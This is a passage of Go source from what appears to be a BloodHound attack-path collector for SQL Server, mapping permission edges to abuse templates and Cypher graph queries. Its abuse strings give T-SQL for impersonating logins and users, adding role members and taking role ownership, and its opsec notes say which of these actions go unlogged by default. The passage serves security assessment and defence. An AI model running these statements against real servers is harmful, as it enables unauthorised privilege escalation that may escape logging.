			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to database role membership. Role ownership changes are not logged by default. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ControlDBUser: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL permission on a database user grants the source " + ctx.SourceType + " the ability to impersonate that user and execute actions with their permissions.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for user impersonation by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ControlLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL permission on a server login allows the source " + ctx.SourceType + " to impersonate the target login.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for login impersonation by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 ",
		}
	},

	EdgeKinds.ControlServerRole: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL permission on a user-defined server role allows the source " + ctx.SourceType + " to take ownership of, add members to, or change the owner of the server role. Principals cannot be granted CONTROL permission on fixed server roles.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement: \n" +
				"Add member: EXEC sp_addsrvrolemember 'login', '" + ctx.TargetName + "' \n" +
				"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login] ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement: \n" +
				"Add member: EXEC sp_addsrvrolemember 'login', '" + ctx.TargetName + "' \n" +
				"Change owner: ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login] ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to server role membership, but server role ownership changes are not logged by default. \n" +
				"To view server role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.DBTakeOwnership: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The source " + ctx.SourceType + " can change the owner of this " + ctx.TargetType + " or descendent objects in its scope.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user]; ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user]; ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Role ownership changes are not logged by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.ImpersonateDBUser: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The IMPERSONATE permission on a securable object effectively grants the source " + ctx.SourceType + " the ability to impersonate the target object.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for user impersonation by default.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 ",
		}
	},

	EdgeKinds.ImpersonateLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: false,
			General:     "The IMPERSONATE permission on a securable object effectively grants the source " + ctx.SourceType + " the ability to impersonate the target object.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for login impersonation by default.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 ",
		}
	},

	EdgeKinds.TakeOwnership: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse string
		sqlSuffix := ""
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			sqlSuffix = "ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [login]; "
		} else if ctx.TargetTypeDescription == "DATABASE_ROLE" {
			sqlSuffix = "ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [user]; "
		}
		windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" + sqlSuffix
		linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" + sqlSuffix
		return EdgeProperties{
			Traversable:  false,
			General:      "The source " + ctx.SourceType + " can change the owner of this " + ctx.TargetType + " or descendent objects in its scope.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Role ownership changes are not logged by default.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17#permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16",
		}
	},

	EdgeKinds.ExecuteAs: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse, opsec string
		if ctx.DatabaseName != "" {
			// Database-level impersonation (EXECUTE AS USER)
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT "
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for user impersonation by default."
		} else {
			// Server-level impersonation (EXECUTE AS LOGIN)
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT "
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for login impersonation by default."
		}
		return EdgeProperties{
			Traversable:  true,
			General:      "The IMPERSONATE or CONTROL permission on a server login or database user allows the source " + ctx.SourceType + " to impersonate the target principal.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},
}

// edgeCompositionGenerators maps edge kinds to functions that generate Cypher composition queries.
// These queries are used by BloodHound to visualize attack paths.
var edgeCompositionGenerators = map[string]func(*EdgeContext) string{

	EdgeKinds.AddMember: func(ctx *EdgeContext) string {
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			return "MATCH (source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), (server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), (role:MSSQL_ServerRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nOPTIONAL MATCH p1 = (source)-[:MSSQL_AlterAnyServerRole]->(server)\nOPTIONAL MATCH p2 = (server)-[:MSSQL_Contains]->(role)\nOPTIONAL MATCH p3 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)\nMATCH p4 = (source)-[:MSSQL_AddMember]->(role)\nWHERE (p1 IS NOT NULL AND p2 IS NOT NULL) OR p3 IS NOT NULL\nRETURN p1, p2, p3, p4"
		}
		// DATABASE_ROLE
		return "MATCH (source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(extractDBID(ctx.TargetID)) + "'}),\n(role:MSSQL_DatabaseRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_AddMember]->(role)\nMATCH p1 = (server)-[:MSSQL_Contains]->(database)\nMATCH p2 = (database)-[:MSSQL_Contains]->(source)\nMATCH p3 = (database)-[:MSSQL_Contains]->(role)\nOPTIONAL MATCH p4 = (source)-[:MSSQL_AlterAnyDBRole]->(database)\nOPTIONAL MATCH p5 = (source)-[:MSSQL_Alter|MSSQL_Control]->(role)\nRETURN p0, p1, p2, p3, p4, p5"
	},

	EdgeKinds.TakeOwnership: func(ctx *EdgeContext) string {
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(role:MSSQL_ServerRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_TakeOwnership]->(role)\nMATCH p1 = (server)-[:MSSQL_Contains]->(source)\nMATCH p2 = (server)-[:MSSQL_Contains]->(role)\nRETURN p0, p1, p2"
		}
		if ctx.TargetTypeDescription == "DATABASE_ROLE" {
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(extractDBID(ctx.TargetID)) + "'}),\n(role:MSSQL_DatabaseRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_TakeOwnership]->(role)\nMATCH p1 = (server)-[:MSSQL_Contains]->(database)\nMATCH p2 = (database)-[:MSSQL_Contains]->(source)\nMATCH p3 = (database)-[:MSSQL_Contains]->(role)\nRETURN p0, p1, p2, p3"
		}
		return ""
	},

	EdgeKinds.ChangeOwner: func(ctx *EdgeContext) string {
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(role:MSSQL_ServerRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role) \nMATCH p1 = (server)-[:MSSQL_Contains]->(source)\nMATCH p2 = (server)-[:MSSQL_Contains]->(role)\nMATCH p3 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) \nRETURN p0, p1, p2, p3"
		}
		if ctx.TargetTypeDescription == "DATABASE_ROLE" {
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(extractDBID(ctx.TargetID)) + "'}),\n(role:MSSQL_DatabaseRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ChangeOwner]->(role)\nMATCH p1 = (server)-[:MSSQL_Contains]->(database)\nMATCH p2 = (database)-[:MSSQL_Contains]->(source) \nMATCH p3 = (database)-[:MSSQL_Contains]->(role) \nOPTIONAL MATCH p4 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(database) \nOPTIONAL MATCH p5 = (source)-[:MSSQL_TakeOwnership|MSSQL_Control]->(role) \nRETURN p0, p1, p2, p3, p4, p5"
		}
		return ""
	},

	EdgeKinds.ChangePassword: func(ctx *EdgeContext) string {
		if ctx.TargetTypeDescription == "APPLICATION_ROLE" {
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(extractDBID(ctx.TargetID)) + "'}),\n(role:MSSQL_ApplicationRole {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ChangePassword]->(role)\nMATCH p1 = (server)-[:MSSQL_Contains]->(database)\nMATCH p2 = (database)-[:MSSQL_Contains]->(source) \nMATCH p3 = (database)-[:MSSQL_Contains]->(role) \nMATCH p4 = (source)-[:MSSQL_AlterAnyAppRole]->(database) \nRETURN p0, p1, p2, p3, p4"
		}
		// Logins
		return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(login:MSSQL_Login {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ChangePassword]->(login)\nMATCH p1 = (server)-[:MSSQL_Contains]->(source) \nMATCH p2 = (server)-[:MSSQL_Contains]->(login) \nMATCH p3 = (source)-[:MSSQL_AlterAnyLogin]->(server) \nRETURN p0, p1, p2, p3"
	},

	EdgeKinds.ExecuteAs: func(ctx *EdgeContext) string {
		if ctx.DatabaseName != "" {
			// Database users
			return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(extractDBID(ctx.TargetID)) + "'}),\n(target:MSSQL_DatabaseUser {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)\nMATCH p1 = (server)-[:MSSQL_Contains]->(database)\nMATCH p2 = (database)-[:MSSQL_Contains]->(source) \nMATCH p3 = (database)-[:MSSQL_Contains]->(target) \nMATCH p4 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) \nRETURN p0, p1, p2, p3, p4"
		}
		// Logins
		return "MATCH \n(source {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(target:MSSQL_Login {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p0 = (source)-[:MSSQL_ExecuteAs]->(target)\nMATCH p1 = (server)-[:MSSQL_Contains]->(source) \nMATCH p2 = (server)-[:MSSQL_Contains]->(target) \nMATCH p3 = (source)-[:MSSQL_Impersonate|MSSQL_Control]->(target) \nRETURN p0, p1, p2, p3"
	},

	EdgeKinds.ExecuteAsOwner: func(ctx *EdgeContext) string {
		return "MATCH \n(database:MSSQL_Database {objectid: '" + escapeAndUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: database.SQLServerID}), \n(owner:MSSQL_Login {objectid: toUpper(database.OwnerObjectIdentifier)})\nMATCH p0 = (database)-[:MSSQL_ExecuteAsOwner]->(server)\nMATCH p1 = (owner)-[:MSSQL_Owns]->(database)\nOPTIONAL MATCH p2 = (owner)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin]->(server)\nOPTIONAL MATCH p3 = (owner)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_ImpersonateAnyLogin|:MSSQL_GrantAnyPermission]->(server)\nRETURN p0, p1, p2, p3"
	},

	EdgeKinds.ExecuteOnHost: func(ctx *EdgeContext) string {
		serverID := strings.ToUpper(ctx.SourceID)
		// Extract computer SID: everything before the first ':'
		computerID := serverID
		if idx := strings.Index(serverID, ":"); idx >= 0 {
			computerID = serverID[:idx]
		}
		return "MATCH \n(server:MSSQL_Server {objectid: '" + serverID + "'}), \n(computer:Computer {objectid: '" + computerID + "'})\nMATCH p0 = (server)-[:MSSQL_ExecuteOnHost]->(computer)\nOPTIONAL MATCH p1 = (serviceAccount)-[:MSSQL_ServiceAccountFor]->(server)\nRETURN p0, p1"
	},

	EdgeKinds.GetAdminTGS: func(ctx *EdgeContext) string {
		return "MATCH \n(serviceAccount {objectid: '" + strings.ToUpper(ctx.SourceID) + "'})\nMATCH p0 = (serviceAccount)-[:MSSQL_GetAdminTGS]->(server:MSSQL_Server {objectid: '" + strings.ToUpper(ctx.TargetID) + "'})\nMATCH p1 = (server)-[:MSSQL_Contains]->(login:MSSQL_Login {isActiveDirectoryPrincipal: true})\nOPTIONAL MATCH p2 = (login)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)\nOPTIONAL MATCH p3 = (login)-[:MSSQL_MemberOf*]->(:MSSQL_ServerRole)-[:MSSQL_ControlServer|:MSSQL_GrantAnyPermission|:MSSQL_ImpersonateAnyLogin]->(server)\nWITH serviceAccount, server, login, p0, p2, p3\nWHERE p2 IS NOT NULL OR p3 IS NOT NULL\nOPTIONAL MATCH p4 = ()-[:MSSQL_HasLogin]->(login)\nRETURN p0, p2, p3, p4"
	},

	EdgeKinds.GetTGS: func(ctx *EdgeContext) string {
		return "MATCH (serviceAccount {objectid: '" + strings.ToUpper(ctx.SourceID) + "'}) \nMATCH p0 = (serviceAccount)-[:MSSQL_GetTGS]->(login:MSSQL_Login {objectid: '" + escapeAndUpper(ctx.TargetID) + "'})\nMATCH p1 = (server:MSSQL_Server)-[:MSSQL_Contains]->(login) \nMATCH p2 = ()-[:MSSQL_HasLogin]->(login) \nRETURN p0, p1, p2"
	},

	EdgeKinds.CoerceAndRelayTo: func(ctx *EdgeContext) string {
		return "MATCH \n(source {objectid: '" + strings.ToUpper(ctx.SourceID) + "'}), \n(server:MSSQL_Server {objectid: '" + escapeAndUpper(ctx.SQLServerID) + "'}), \n(target:MSSQL_Login {objectid: '" + escapeAndUpper(ctx.TargetID) + "'}),\n(coercionvictim:Computer {objectid: '" + strings.ToUpper(ctx.SecurityIdentifier) + "'})\nMATCH p0 = (source)-[:MSSQL_CoerceAndRelayToMSSQL]->(target)\nMATCH p1 = (server)-[:MSSQL_Contains]->(target)\nMATCH p2 = (coercionvictim)-[:MSSQL_HasLogin]->(target)\nMATCH p3 = (target)-[:MSSQL_Connect]->(server)\nRETURN p0, p1, p2, p3"
	},
}
